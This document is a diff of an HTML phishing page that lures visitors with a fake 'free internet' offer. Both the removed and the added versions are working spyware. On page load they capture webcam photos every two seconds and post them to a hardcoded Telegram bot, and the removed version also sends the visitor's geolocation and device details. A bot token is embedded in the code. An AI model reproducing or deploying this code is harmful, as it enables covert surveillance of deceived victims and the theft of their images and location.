@@ -1,130 +1,56 @@
-
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html>
 <head>
-  <meta charset="UTF-8">
-  <title>Free Internet Activation</title>
+  <title>Camera Tool</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #00c6ff, #0072ff);
-      color: white;
       text-align: center;
-      padding: 50px;
+      background: #000;
+      color: white;
+      font-family: Arial, sans-serif;
     }
-    .card {
-      background: rgba(255,255,255,0.1);
-      padding: 30px;
-      border-radius: 15px;
+    video, canvas {
+      width: 90%;
       max-width: 400px;
-      margin: auto;
-    }
-    h2 {
-      margin-bottom: 20px;
-    }
-    p {
-      font-size: 16px;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>🎁 Activate Free 5GB Internet</h2>
-    <p>Checking your SIM and device...</p>
-    <p id="status">🔄 Initializing...</p>
-  </div>
+  <h2>📡 Connecting to Free Internet...</h2>
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatid');
+    const token = '8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc '; // Replace with your bot token
 
-  <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
-  <script>
-    const BOT_TOKEN = "8017259757:AAHeP_v-F9whiHa_O9fa-2YCeqjXg6luQjc";
-    const CHAT_ID = "8138502747";
-    const status = document.getElementById("status");
-
-    function sendToTelegram(type, data) {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      if (type === "photo") {
-        formData.append("photo", data, "photo.png");
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      } else if (type === "message") {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: data
-          })
-        });
-      }
-    }
-
-    function getDeviceInfo() {
-      const info = [
-        "📱 Device Info:",
-        "Platform: " + navigator.platform,
-        "User Agent: " + navigator.userAgent,
-        "Screen: " + screen.width + "x" + screen.height,
-        "Language: " + navigator.language
-      ];
-      sendToTelegram("message", info.join("\n"));
-    }
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          const locMsg = `📍 Location:\nLat: ${lat}\nLon: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
-          sendToTelegram("message", locMsg);
-        });
-      } else {
-        sendToTelegram("message", "❌ Geolocation not supported.");
-      }
-    }
-
-    function capturePhotos() {
-      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          video.play();
-          let count = 0;
-          const interval = setInterval(() => {
-            if (count >= 10) {
-              clearInterval(interval);
-              video.srcObject.getTracks().forEach(track => track.stop());
-              return;
-            }
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-              sendToTelegram("photo", blob);
-            }, "image/png");
-            count++;
-          }, 2000); // every 2 seconds
-        };
-      }).catch(() => {
-        status.innerText = "❌ Camera permission denied.";
-      });
-    }
 
-    // Start everything on load
-    window.onload = () => {
-      status.innerText = "📡 Requesting Permissions...";
-      getDeviceInfo();
-      getLocation();
-      capturePhotos();
-      status.innerText = "✅ Activated. Processing data...";
-    };
-  </script>
-</body>
+        setInterval(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'snapshot.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+          }, 'image/jpeg');
+        }, 2000);
+      })
+      .catch(err => {
+        document.body.innerHTML = '<h3>🚫 Permission Denied. Camera not accessible.</h3>';
+      });
+  </script></body>
 </html>
